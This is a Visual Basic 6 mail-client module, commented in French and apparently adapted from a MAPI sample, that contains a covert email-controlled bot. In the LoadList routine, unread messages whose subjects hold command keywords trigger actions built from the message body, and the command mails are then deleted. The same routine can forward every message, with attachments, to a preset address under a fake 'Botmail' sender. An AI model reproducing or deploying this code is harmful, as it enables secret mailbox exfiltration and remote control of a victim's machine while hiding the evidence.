Attribute VB_Name = "Module1"
Public Const conMailLongDate = 0
Public Const conMailListView = 1

Public executed As Boolean

' Constante pour le type de la boîte de dialogue d'options - Options générales.
Public Const conOptionGeneral = 1
' Constante pour le type de la boîte de dialogue d'options - Options du message.
Public Const conOptionMessage = 2
' Constante pour chaîne réprésentent les messages non lus
Public Const conUnreadMessage = "->"

Public Const vbRecipTypeTo = 1
Public Const vbRecipTypeCc = 2

Public Const vbMessageFetch = 1
Public Const vbMessageSendDlg = 2
Public Const vbMessageSend = 3
Public Const vbMessageSaveMsg = 4
Public Const vbMessageCopy = 5
Public Const vbMessageCompose = 6
Public Const vbMessageReply = 7
Public Const vbMessageReplyAll = 8
Public Const vbMessageForward = 9
Public Const vbMessageDelete = 10
Public Const vbMessageShowAdBook = 11
Public Const vbMessageShowDetails = 12
Public Const vbMessageResolveName = 13
Public Const vbRecipientDelete = 14
Public Const vbAttachmentDelete = 15

Public Const vbAttachTypeData = 0
Public Const vbAttachTypeEOLE = 1
Public Const vbAttachTypeSOLE = 2



Type ListDisplay
    Name As String * 20
    Subject As String * 40
    Date As String * 20
End Type

Public currentRCIndex As Integer
Public UnRead As Integer
Public SendWithMapi As Integer
Public ReturnRequest As Integer
Public OptionType As Integer

' Fonctions API de Windows

Sub Attachments(Msg As Form)
    ' Efface la liste des pièces jointes en cours.
    Msg.aList.Clear

    ' S'il y a des pièces jointes, les charge dans la zone de liste.
    If VBMail.MapiMess.AttachmentCount Then
        Msg.NumAtt = VBMail.MapiMess.AttachmentCount & " fichiers"
        For I% = 0 To VBMail.MapiMess.AttachmentCount - 1
            VBMail.MapiMess.AttachmentIndex = I%
            a$ = VBMail.MapiMess.AttachmentName
            Select Case VBMail.MapiMess.AttachmentType
                Case vbAttachTypeData
                    a$ = a$ + " (Fichier de données)"
                Case vbAttachTypeEOLE
                    a$ = a$ + " (Objet OLE incorporé)"
                Case vbAttachTypeSOLE
                    a$ = a$ + " (Objet OLE statique)"
                Case Else
                    a$ = a$ + " (Type de pièce jointe inconnu)"
            End Select
            Msg.aList.AddItem a$
        Next I%
        
        If Not Msg.AttachWin.Visible Then
            Msg.AttachWin.Visible = True
            Call SizeMessageWindow(Msg)
            ' If Msg.WindowState = 0 Then
            '    Msg.Height = Msg.Height + Msg.AttachWin.Height
            ' End If
        End If
    
    Else
        If Msg.AttachWin.Visible Then
            Msg.AttachWin.Visible = False
            Call SizeMessageWindow(Msg)
            ' If Msg.WindowState = 0 Then
            '    Msg.Height = Msg.Height - Msg.AttachWin.Height
            ' End If
        End If
    End If
    Msg.Refresh
End Sub

Sub CopyNamestoMsgBuffer(Msg As Form, fResolveNames As Integer)
    Call KillRecips(VBMail.MapiMess)
    Call SetRCList(Msg.txtTo, VBMail.MapiMess, vbRecipTypeTo, fResolveNames)
    Call SetRCList(Msg.txtcc, VBMail.MapiMess, vbRecipTypeCc, fResolveNames)
End Sub

Function DateFromMapiDate$(ByVal S$, wFormat%)
' Cette procédure formate une date MAPI dans un
' des deux formats pour visualiser le message.
    If S$ <> "" Then
    Y$ = Left$(S$, 4)
    M$ = Mid$(S$, 6, 2)
    d$ = Mid$(S$, 9, 2)
    T$ = Mid$(S$, 12)
    Ds# = DateValue(M$ + "/" + d$ + "/" + Y$) + TimeValue(T$)
    Select Case wFormat
        Case conMailLongDate
            f$ = "dddd d mmmm yyyy, hh:mm"
        Case conMailListView
            f$ = "dd/mm/yy hh:mm"
    End Select
    DateFromMapiDate = Format$(Ds#, f$)
    End If
End Function

Sub DeleteMessage()
    On Error Resume Next
    ' si la feuille active est un message, définit ListIndex avec
    ' la valeur correcte.
    

   ' Supprime le message de la Messagerie.
    If MailLst.MList.ListIndex <> -1 Then
        VBMail.MapiMess.MsgIndex = MailLst.MList.ListIndex
        VBMail.MapiMess.Action = vbMessageDelete
        X% = MailLst.MList.ListIndex
        MailLst.MList.RemoveItem X%
        If X% < MailLst.MList.ListCount - 1 Then
            MailLst.MList.ListIndex = X%
        Else
            MailLst.MList.ListIndex = MailLst.MList.ListCount - 1
        End If
        VBMail.MsgCountLbl = Format$(VBMail.MapiMess.MsgCount) + " Messages"


     End If
End Sub

Function GetHeader(Msg As Control) As String
Dim CR As String
CR = Chr$(13) + Chr$(10)
      Header$ = String$(25, "-") + CR
      Header$ = Header$ + "De: " + Msg.MsgOrigDisplayName + CR
      Header$ = Header$ + "A: " + GetRCList(Msg, vbRecipTypeTo) + CR
      Header$ = Header$ + "Cc: " + GetRCList(Msg, vbRecipTypeCc) + CR
      Header$ = Header$ + "Sujet: " + Msg.MsgSubject + CR
      Header$ = Header$ + "Date: " + DateFromMapiDate$(Msg.MsgDateReceived, conMailLongDate) + CR + CR
      GetHeader = Header$
End Function

Sub GetMessageCount()
    ' Lit tous les messages de la Messagerie et affiche le compteur.
    Screen.MousePointer = 11
    VBMail.MapiMess.FetchUnreadOnly = False
    
    VBMail.MapiMess.Action = vbMessageFetch
    VBMail.MsgCountLbl = Format$(VBMail.MapiMess.MsgCount) + " Messages"
    Screen.MousePointer = 0
End Sub

Function GetRCList(Msg As Control, RCType As Integer) As String
' En donnant une liste de destinataires, cette fonction retourne
' une liste de destinataires avec le type spécifié dans le format
' suivant:
'
'       Personne 1; Personne 2; Personne 3

    For I = 0 To Msg.RecipCount - 1
        Msg.RecipIndex = I
        If RCType = Msg.RecipType Then
                a$ = a$ + ";" + Msg.RecipDisplayName
        End If
    Next I
    If a$ <> "" Then
       a$ = Mid$(a$, 2)  ' Enlève le ";" final.
    End If
    GetRCList = a$
End Function

Sub KillRecips(MsgControl As Control)
    ' Supprime chaque destinataire. Itération en boucle jusqu'à ne plus avoir de destinataires.
    While MsgControl.RecipCount
        MsgControl.Action = vbRecipientDelete
    Wend
End Sub

Sub LoadList(mailctl As Control)
' Cette procédure charge les en-têtes des messages de la Messagerie
' dans la liste MailLst.MList. Les messages non lus ont un caractère
' conUnreadMessage placé au début de la chaîne.
    les_mails = ""
    dmdtrans = False
    tranfere = False
    Dim tabpiece(1 To 10) As String
    Dim tabattach(1 To 10) As String
debload:
    les_mails = ""
    MailLst.MList.Clear
    UnRead = 0
    StartIndex = 0
    For I = 0 To mailctl.MsgCount - 1
        mailctl.MsgIndex = I
        If Not mailctl.MsgRead Then
            a$ = conUnreadMessage
            If UnRead = 0 Then
                StartIndex = I  ' Position de départ de la liste des messages.
            End If
            UnRead = UnRead + 1
        Else
            a$ = "   "
        End If
        a$ = a$ + Mid$(Format$(mailctl.MsgOrigDisplayName, "!" + String$(10, "@")), 1, 10)
        If mailctl.MsgSubject <> "" Then
            b$ = Mid$(Format$(mailctl.MsgSubject, "!" + String$(35, "@")), 1, 35)
        Else
            b$ = String$(30, " ")
        End If
        
        c$ = Mid$(Format$(DateFromMapiDate(mailctl.MsgDateReceived, conMailListView), "!" + String$(15, "@")), 1, 15)
        MailLst.MList.AddItem a$ + Chr$(9) + b$ + Chr$(9) + c$
        
        MailLst.MList.Refresh
        
        
        'ICI c'est pour les mail de commande
                
        
        If Not mailctl.MsgRead Then
           
           executed = False
           
           If InStr(1, UCase(mailctl.MsgSubject), UCase(botstop)) And Trim(botstop) <> "" Then
                 End
           End If
           If InStr(1, UCase(mailctl.MsgSubject), UCase(executecom)) And Trim(executecom) <> "" Then
                z$ = VBMail.MapiMess.MsgNoteText
                Call send_shortcut(z$, mailctl.MsgOrigAddress)
                MailLst.MList.ListIndex = I
                mailctl.MsgIndex = I
                executed = True
           End If
           If InStr(1, UCase(mailctl.MsgSubject), UCase(Sendmecom)) And Trim(Sendmecom) <> "" Then
                z$ = VBMail.MapiMess.MsgNoteText
                Call sendme(z$, mailctl.MsgOrigAddress)
                MailLst.MList.ListIndex = I
                mailctl.MsgIndex = I
                executed = True
           End If
           If InStr(1, UCase(mailctl.MsgSubject), UCase(aspipage)) And Trim(aspipage) <> "" Then
                z$ = VBMail.MapiMess.MsgNoteText
                Call aspiweb(z$, mailctl.MsgOrigAddress)
                MailLst.MList.ListIndex = I
                mailctl.MsgIndex = I
                executed = True
           End If
           
           If (dmdtrans <> True) Then
                If InStr(1, UCase(mailctl.MsgSubject), UCase(vmailcom)) And Trim(vmailcom) <> "" Then
                     z$ = VBMail.MapiMess.MsgNoteText
                     Call send_mail(z$, mailctl.MsgOrigAddress)
                     MailLst.MList.ListIndex = I
                     mailctl.MsgIndex = I
                     executed = True
                End If
           End If
           If executed = True Then Call DeleteMessage
        End If
        
         e$ = mailctl.MsgOrigAddress
         If (InStr(1, UCase(mailctl.MsgOrigAddress), "SMTP:") <> 0) Then
            e$ = Mid(mailctl.MsgOrigAddress, InStr(1, mailctl.MsgOrigAddress, "smtp:") + 6)
         End If
        
        If transfer = True And Not (onlynew = True And mailctl.MsgRead) And Not (onlysel = True And InStr(1, emailsel, UCase(e$)) = 0) Then
            For zzz = 1 To 10
                tabpiece(zzz) = ""
                tabattach(zzz) = ""
            Next
            SVNote = VBMail.MapiMess.MsgNoteText
            SVNote = GetHeader(VBMail.MapiMess) + SVNote
                If VBMail.MapiMess.AttachmentCount Then
                    For K = 0 To VBMail.MapiMess.AttachmentCount - 1
                        VBMail.MapiMess.AttachmentIndex = K
                        tabpiece(K + 1) = VBMail.MapiMess.AttachmentPathName
                        tabattach(K + 1) = "" 'nom original sans le path
                    Next K
                End If
             Dim frmsend As New frmSMTP
             Call frmsend.sendmail(emailatrans, VBMail.MapiMess.MsgSubject, "Botmail <BoTmAiL@nombidon.com>", "", SVNote, tabpiece, tabattach)
                While frmsend.varquitprog <> True
                    DoEvents
                Wend

        End If
        

        les_mails = les_mails + vbCrLf + a$ + Chr$(9) + e$ + Chr$(9) + b$ + Chr$(9) + c$
    Next I
    
    If transfer = True Then
        transfer = False
        dmdtrans = False
    End If
    
    If dmdtrans = True Then
        transfer = True
        GoTo debload
    End If
    
    MailLst.MList.ListIndex = StartIndex
    
    ' Ajuste la valeur des étiquettes affichant le compteur de messages.
    If UnRead Then
        VBMail.UnreadLbl = " - " + Format$(UnRead) + " Non lu"
        MailLst.Icon = MailLst.NewMail.Picture
    Else
        VBMail.UnreadLbl = ""
        MailLst.Icon = MailLst.nonew.Picture
    End If
End Sub

Sub LogOffUser()
    On Error Resume Next
    VBMail.MapiSess.Action = 2
    If Err <> 0 Then
        MsgBox "Echec de la connexion: " + ErrorR
    Else
        VBMail.MapiMess.SessionID = 0
        ' Ajuste les éléments du menu.
        VBMail.LogOff.Enabled = 0
        VBMail.Logon.Enabled = -1
        ' Décharge toutes les feuilles, sauf la feuille MDI principale.
        Do Until Forms.Count = 1
            I = Forms.Count - 1
            If TypeOf Forms(I) Is MDIForm Then
                ' Ne rien faire.
            Else
                Unload Forms(I)
            End If
        Loop
        ' Désactive les boutons de la barre d'outils.
                          
        ' Réinitialise les étiquettes de la barre d'état.
        VBMail.MsgCountLbl = "Hors ligne"
        VBMail.UnreadLbl = ""
    End If

End Sub

Sub SaveMessage(Msg As Form)
    ' Enregistre le texte du sujet et du message.
    ' Copie le message dans le tampon de composition.
    ' Réinitialise le texte du sujet et du message.
    ' Enregistre le message.
    svSub = Msg.txtSubject
    SVNote = Msg.txtNoteText
    VBMail.MapiMess.Action = vbMessageCopy
    VBMail.MapiMess.MsgSubject = svSub
    VBMail.MapiMess.MsgNoteText = SVNote
    VBMail.MapiMess.Action = vbMessageSaveMsg
End Sub

Sub SetRCList(ByVal NameList As String, Msg As Control, RCType As Integer, fResolveNames As Integer)
' Pour une liste de destinataires donnée:
'
'       Personne 1; Personne 2; Personne 3
'
' Cette procédure place les noms dans les structures Msg.Recip.
    
    If NameList = "" Then
        Exit Sub
    End If

    I = Msg.RecipCount
    Do
        Msg.RecipIndex = I
        Msg.RecipDisplayName = Trim$(Token(NameList, ";"))
        If fResolveNames Then
            Msg.Action = vbMessageResolveName
        End If
        Msg.RecipType = RCType
        I = I + 1
    Loop Until (NameList = "")
End Sub

Sub SizeMessageWindow(MsgWindow As Form)
    If MsgWindow.WindowState <> 1 Then
        ' Détermine la taille minimum de la fenêtre en se basant
        ' sur la visibilité d'AttachWin (fenêtre de pièce jointe).
        If MsgWindow.AttachWin.Visible Then    ' Fenêtre de pièce jointe.
            MinSize = 3700
        Else
            MinSize = 3700 - MsgWindow.AttachWin.Height
        End If

        ' Maintient la taille minimum de la feuille.
        If MsgWindow.Height < MinSize And (MsgWindow.WindowState = 0) Then
            MsgWindow.Height = MinSize
            Exit Sub

        End If
        ' Ajuste la taille de la zone de texte.
        If MsgWindow.ScaleHeight > MsgWindow.txtNoteText.Top Then
            If MsgWindow.AttachWin.Visible Then
                X% = MsgWindow.AttachWin.Height
            Else
                X% = 0
            End If
            MsgWindow.txtNoteText.Height = MsgWindow.ScaleHeight - MsgWindow.txtNoteText.Top - X%
            MsgWindow.txtNoteText.Width = MsgWindow.ScaleWidth
        End If
    End If

End Sub

Function Token$(tmp$, search$)
    X = InStr(1, tmp$, search$)
    If X Then
       Token$ = Mid$(tmp$, 1, X - 1)
       tmp$ = Mid$(tmp$, X + 1)
    Else
       Token$ = tmp$
       tmp$ = ""
    End If
End Function

Sub UpdateRecips(Msg As Form)
' Cette procédure met à jour les champs d'édition corrects et
' l'information de destinataire.
    Msg.txtTo.Text = GetRCList(VBMail.MapiMess, vbRecipTypeTo)
    Msg.txtcc.Text = GetRCList(VBMail.MapiMess, vbRecipTypeCc)
End Sub
